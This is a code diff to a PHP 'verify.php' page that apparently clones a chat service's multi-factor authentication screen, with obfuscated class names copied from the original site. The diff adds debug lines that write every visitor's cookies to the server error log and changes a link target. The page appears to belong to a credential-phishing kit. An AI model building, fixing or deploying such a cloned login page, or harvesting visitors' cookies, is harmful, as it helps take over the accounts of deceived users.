@@ -1,7 +1,13 @@
 <?php 
-    require("source/core/system/translation.php");
-    require("source/errors/invalid_mfa.php");
+error_log("========== VERIFY.PHP CARREGADO ==========");
+error_log("Cookies disponíveis: " . print_r($_COOKIE, true));
+error_log("==========================================");
+
+require("source/core/system/translation.php");
+require("source/errors/invalid_mfa.php");
 ?>
+<meta charset="utf-8">
+<!-- resto do HTML continua igual -->
 <meta charset="utf-8">
     <html lang="ru" style="font-size: 100%" class="full-motion app-focused theme-dark platform-web oldBrand" data-rh="lang,style,class">
     <head>
@@ -50,7 +56,7 @@
                                             <span class="spinner-2enMB9 spinner-3a9zLT" id="loadi" style="display: none;"><span class="inner-1gJC7_ pulsingEllipsis-3YiXRF"><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span></span></span>
                                             <div class="contents-18-Yxp"><?php echo $mfa[5];?></div>
                                         </button><button type="button" class="marginTop4-2BNfKC linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
-                                            <div class="contents-18-Yxp" onclick="window.open('index.php', '_self');"><?php echo $mfa[6];?></div>
+                                            <div class="contents-18-Yxp" onclick="window.open('index.html', '_self');"><?php echo $mfa[6];?></div>
                                         </button>
                                     </div>
                                 </div>
